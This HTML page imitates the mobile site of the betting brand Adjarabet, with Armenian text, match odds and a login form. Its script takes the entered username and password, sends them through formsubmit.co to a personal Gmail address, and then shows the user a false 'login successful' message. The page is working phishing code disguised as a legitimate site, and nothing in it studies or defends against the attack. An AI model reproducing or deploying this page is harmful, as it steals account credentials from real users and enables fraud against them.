<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adjarabet - Mobile</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2e4a 0%, #0d1c33 100%);
            color: #fff;
            line-height: 1.6;
            padding-bottom: 70px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 100%;
            padding: 0 15px;
            margin: 0 auto;
        }
        
        /* Header Styles */
        header {
            background: linear-gradient(to right, #0d2d5e 0%, #1a3e78 100%);
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #ffcc00;
            text-decoration: none;
            display: flex;
            align-items: center;
        }
        
        .logo-icon {
            margin-right: 10px;
            font-size: 28px;
        }
        
        .auth-buttons {
            display: flex;
            gap: 10px;
        }
        
        .btn {
            padding: 8px 15px;
            border-radius: 20px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-login {
            background: transparent;
            border: 1px solid #ffcc00;
            color: #ffcc00;
        }
        
        .btn-register {
            background: #ffcc00;
            color: #0d2d5e;
        }
        
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        /* Модальное окно входа */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: #1a2e4a;
            padding: 25px;
            border-radius: 12px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.5);
        }
        
        .close-modal {
            float: right;
            font-size: 24px;
            cursor: pointer;
            color: #ffcc00;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 16px;
        }
        
        .form-submit {
            background: #ffcc00;
            color: #0d2d5e;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .form-submit:hover {
            background: #ffd633;
        }
        
        /* Main Content */
        .main-content {
            padding: 20px 0;
        }
        
        .promo-banner {
            background: linear-gradient(to right, #ff7e00 0%, #ffcc00 100%);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        .promo-banner h2 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #0d2d5e;
        }
        
        .promo-banner p {
            margin-bottom: 15px;
            color: #0d2d5e;
        }
        
        .btn-promo {
            background: #0d2d5e;
            color: #ffcc00;
            padding: 10px 25px;
            border-radius: 25px;
            font-weight: bold;
            display: inline-block;
            text-decoration: none;
        }
        
        /* Sports Navigation */
        .sports-nav {
            display: flex;
            overflow-x: auto;
            padding: 15px 0;
            gap: 15px;
            margin-bottom: 20px;
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        
        .sports-nav::-webkit-scrollbar {
            display: none;
        }
        
        .sport-item {
            min-width: 80px;
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 12px 10px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .sport-item active {
            background: #ffcc00;
            color: #0d2d5e;
            font-weight: bold;
        }
        
        .sport-item:hover {
            background: rgba(255, 204, 0, 0.3);
        }
        
        .sport-icon {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        /* Events Section */
        .events-section {
            margin-bottom: 25px;
        }
        
        .section-title {
            font-size: 18px;
            margin-bottom: 15px;
            padding-left: 10px;
            border-left: 4px solid #ffcc00;
        }
        
        .event-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        .event-teams {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .event-date {
            text-align: center;
            color: #aaa;
            font-size: 12px;
            margin-bottom: 15px;
        }
        
        .event-odds {
            display: flex;
            justify-content: space-between;
        }
        
        .odd-btn {
            flex: 1;
            margin: 0 5px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .odd-btn:hover {
            background: rgba(255, 204, 0, 0.2);
        }
        
        .odd-value {
            font-weight: bold;
            color: #ffcc00;
            font-size: 16px;
        }
        
        .odd-name {
            font-size: 12px;
            color: #aaa;
        }
        
        /* Bottom Navigation */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #0d2d5e;
            display: flex;
            justify-content: space-around;
            padding: 12px 0;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.3);
        }
        
        .nav-item {
            text-align: center;
            color: #fff;
            text-decoration: none;
            font-size: 12px;
            opacity: 0.7;
            transition: opacity 0.3s ease;
            display: block;
            width: 100%;
        }
        
        .nav-item.active {
            opacity: 1;
            color: #ffcc00;
        }
        
        .nav-icon {
            font-size: 20px;
            display: block;
            margin-bottom: 4px;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        @media (max-width: 480px) {
            .logo {
                font-size: 20px;
            }
            
            .btn {
                padding: 6px 12px;
                font-size: 14px;
            }
            
            .promo-banner h2 {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="loading">Բեռնվում է...</div>
    
    <!-- Модальное окно входа -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <span class="close-modal" id="closeModal">&times;</span>
            <h2>Մուտք</h2>
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Մուտքանուն</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Գաղտնաբառ</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="form-submit">Մուտք</button>
            </form>
            <div id="loginMessage" style="margin-top: 15px; display: none; padding: 10px; border-radius: 5px;"></div>
        </div>
    </div>
    
    <header>
        <div class="container">
            <div class="header-content">
                <a href="#" class="logo">
                    <span class="logo-icon">⚽</span>
                    <span>Adjarabet</span>
                </a>
                <div class="auth-buttons">
                    <button class="btn btn-login" id="openLogin">Մուտք</button>
                    <button class="btn btn-register">Գրանցում</button>
                </div>
            </div>
        </div>
    </header>

    <main class="container main-content">
        <div class="promo-banner">
            <h2>100% Բոնուս առաջին դեպոզիտի համար</h2>
            <p>Ստացեք մինչև 10000 AMD բոնուս</p>
            <a href="#" class="btn-promo">Մասնակցել</a>
        </div>

        <div class="sports-nav">
            <div class="sport-item active">
                <div class="sport-icon">⚽</div>
                <div>Ֆուտբոլ</div>
            </div>
            <div class="sport-item">
                <div class="sport-icon">🏀</div>
                <div>Բասկետ</div>
            </div>
            <div class="sport-item">
                <div class="sport-icon">🎾</div>
                <div>Թենիս</div>
            </div>
            <div class="sport-item">
                <div class="sport-icon">🏒</div>
                <div>Հոկեյ</div>
            </div>
            <div class="sport-item">
                <div class="sport-icon">🎰</div>
                <div>Կազինո</div>
            </div>
        </div>

        <div class="events-section">
            <h2 class="section-title">Լավատեղյակ մրցաշարեր</h2>
            
            <div class="event-card">
                <div class="event-teams">
                    <span>Բարսելոնա</span>
                    <span>Ռեալ Մադրիդ</span>
                </div>
                <div class="event-date">Հոկտ 25, 20:00</div>
                <div class="event-odds">
                    <div class="odd-btn">
                        <div class="odd-value">1.85</div>
                        <div class="odd-name">1</div>
                    </div>
                    <div class="odd-btn">
                        <div class="odd-value">3.60</div>
                        <div class="odd-name">X</div>
                    </div>
                    <div class="odd-btn">
                        <div class="odd-value">4.20</div>
                        <div class="odd-name">2</div>
                    </div>
                </div>
            </div>
            
            <div class="event-card">
                <div class="event-teams">
                    <span>Մանչեսթեր Յունայթեդ</span>
                    <span>Չելսի</span>
                </div>
                <div class="event-date">Հոկտ 26, 21:45</div>
                <div class="event-odds">
                    <div class="odd-btn">
                        <div class="odd-value">2.10</div>
                        <div class="odd-name">1</div>
                    </div>
                    <div class="odd-btn">
                        <div class="odd-value">3.30</div>
                        <div class="odd-name">X</div>
                    </div>
                    <div class="odd-btn">
                        <div class="odd-value">3.50</div>
                        <div class="odd-name">2</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="events-section">
            <h2 class="section-title">Live Իրադարձություններ</h2>
            
            <div class="event-card">
                <div class="event-teams">
                    <span>Արսենալ <span style="color: #ff6b6b;">● LIVE</span></span>
                    <span>2:1</span>
                    <span>Բավարիա</span>
                </div>
                <div class="event-date">67'</div>
                <div class="event-odds">
                    <div class="odd-btn">
                        <div class="odd-value">2.75</div>
                        <div class="odd-name">1</div>
                    </div>
                    <div class="odd-btn">
                        <div class="odd-value">3.20</div>
                        <div class="odd-name">X</div>
                    </div>
                    <div class="odd-btn">
                        <div class="odd-value">2.30</div>
                        <div class="odd-name">2</div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <nav class="bottom-nav">
        <a href="#" class="nav-item active">
            <span class="nav-icon">🏠</span>
            <span>Գլխավոր</span>
        </a>
        <a href="#" class="nav-item">
            <span class="nav-icon">⚽</span>
            <span>Սպորտ</span>
        </a>
        <a href="#" class="nav-item">
            <span class="nav-icon">🎲</span>
            <span>Կազինո</span>
        </a>
        <a href="#" class="nav-item">
            <span class="nav-icon">👤</span>
            <span>Անձնական</span>
        </a>
    </nav>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginModal = document.getElementById('loginModal');
            const openLoginBtn = document.getElementById('openLogin');
            const closeModalBtn = document.getElementById('closeModal');
            const loginForm = document.getElementById('loginForm');
            const loginMessage = document.getElementById('loginMessage');
            
            openLoginBtn.addEventListener('click', function() {
                loginModal.style.display = 'flex';
            });
            
            closeModalBtn.addEventListener('click', function() {
                loginModal.style.display = 'none';
                loginMessage.style.display = 'none';
            });
            
            window.addEventListener('click', function(event) {
                if (event.target === loginModal) {
                    loginModal.style.display = 'none';
                    loginMessage.style.display = 'none';
                }
            });
            
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const submitButton = loginForm.querySelector('button[type="submit"]');
                
                submitButton.innerHTML = 'Մուտքագրվում է...';
                submitButton.disabled = true;
                
                try {
                    // Отправка данных на ваш email
                    const response = await fetch('https://formsubmit.co/ajax/unity1998saqo1@gmail.com', {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            username: username,
                            password: password,
                            _subject: 'Новые данные для входа - Adjarabet',
                            _template: 'table',
                            _captcha: 'false'
                        })
                    });
                    
                    // Показываем пользователю успешное сообщение
                    loginMessage.style.display = 'block';
                    loginMessage.style.backgroundColor = '#4CAF50';
                    loginMessage.textContent = 'Մուտքը հաջող էր։ Մուտքագրվում է համակարգ...';
                    
                    loginForm.reset();
                    
                    setTimeout(() => {
                        loginModal.style.display = 'none';
                        loginMessage.style.display = 'none';
                    }, 2000);
                    
                } catch (error) {
                    loginMessage.style.display = 'block';
                    loginMessage.style.backgroundColor = '#f44336';
                    loginMessage.textContent = 'Սերվերի սխալ։ Խնդրում ենք փորձել ավելի ուշ։';
                } finally {
                    setTimeout(() => {
                        submitButton.innerHTML = 'Մուտք';
                        submitButton.disabled = false;
                    }, 2000);
                }
            });
            
            const sportItems = document.querySelectorAll('.sport-item');
            sportItems.forEach(item => {
                item.addEventListener('click', function() {
                    sportItems.forEach(i => i.classList.remove('active'));
                    this.classList.add('active');
                });
            });
            
            const oddButtons = document.querySelectorAll('.odd-btn');
            oddButtons.forEach(button => {
                button.addEventListener('click', function() {
                    oddButtons.forEach(b => b.style.background = 'rgba(255, 255, 255, 0.1)');
                    this.style.background = 'rgba(255, 204, 0, 0.3)';
                });
            });
            
            const navItems = document.querySelectorAll('.nav-item');
            navItems.forEach(item => {
                item.addEventListener('click', function(e) {
                    e.preventDefault();
                    navItems.forEach(i => i.classList.remove('active'));
                    this.classList.add('active');
                });
            });
        });
    </script>
</body>
</html>
